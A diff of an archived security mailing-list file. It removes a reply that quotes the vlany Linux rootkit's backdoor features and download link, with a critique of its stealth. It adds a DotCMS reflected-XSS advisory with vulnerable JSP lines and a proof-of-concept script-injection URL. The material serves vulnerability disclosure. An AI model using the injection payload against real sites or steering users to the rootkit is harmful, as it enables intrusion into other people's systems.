@@ -1,37 +1,40 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/10/7
-Message-ID: <20161110155654.GL1555@oevtugenva.nrevsny.pk>
-Date: Thu, 10 Nov 2016 10:56:54 -0500
-From: Rich Felker <dalias@...c.org>
-To: oss-security@...ts.openwall.com
-Subject: Re: Vlany: A Linux (LD_PRELOAD) rootkit
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/08/2
+Message-ID: <CAA0JNpS5KzKvug_xPubFpbfj-7SMBhKj_-jXzJRfGFCx8fYdGA@mail.gmail.com>
+Date: Fri, 8 Apr 2016 11:09:55 +0800
+From: xiong piaox <yahoo860201@...il.com>
+To: fulldisclosure@...lists.org
+Cc: bugs@...uritytracker.com, bugtraq@...urityfocus.com,  oss-security@...ts.openwall.com
+Subject: [CVE-2016-3971]DotCMS xss vulnerability
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Nov 10, 2016 at 01:18:44PM +0200, eov eov wrote:
-> Features:
-> 
-> Process hiding
-> User hiding
-> Network hiding
-> LXC container
-> Anti-Debug
-> Anti-Forensics
-> Persistent (re)installation & Anti-Detection
-> Dynamic linker modifications
-> Backdoors
-> accept() backdoor (derived from Jynx2)
-> PAM backdoor
-> PAM auth logger
-> vlany-exclusive commands
-> 
-> Download: https://github.com/mempodippy/vlany
+Advisory: DotCMS xss vulnerability
 
-At a quick glance, this would be trivially noticed by using strace. It
-also badly breaks thread-safety and AS-safety of lots of the
-interfaces it overrides, so you would expect deadlocks and crashes and
-other weird behavior in multithreaded processes and processes which
-make significant use of signal handlers, which would suggest to the
-user that something is badly wrong (and probably trigger them to try
-strace or gdb) without them actively scanning for anything.
+Author: Piaox From Pingan Product Safety Group
 
-Rich
+Email: xiongyaofu351@...gan.com.cn
+
+Affected Version: dotCMS 3.5 Beta(the latest version)
+
+
+Vulnerability Description
+
+lucene_search.jsp
+
+ 26 String query = request.getParameter("query");
+
+ 27 if(!UtilMethods.isSet(query)){
+
+ 28         query = "";
+
+ 29 }
+
+164                 <div><strong><%= LanguageUtil.get(pageContext,
+"Query-is") %> : </strong><%=query%></div>
+
+POC && EXP
+
+http://127.0.0.1:8080/c/portal/layout?p_l_id=a8e430e3-8010-40cf-ade1-5978e61241a8&p_p_id=EXT_LUCENE_TOOL&p_p_action=0&
+
+query=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&offset=0&limit=20&sort=&userid=
+
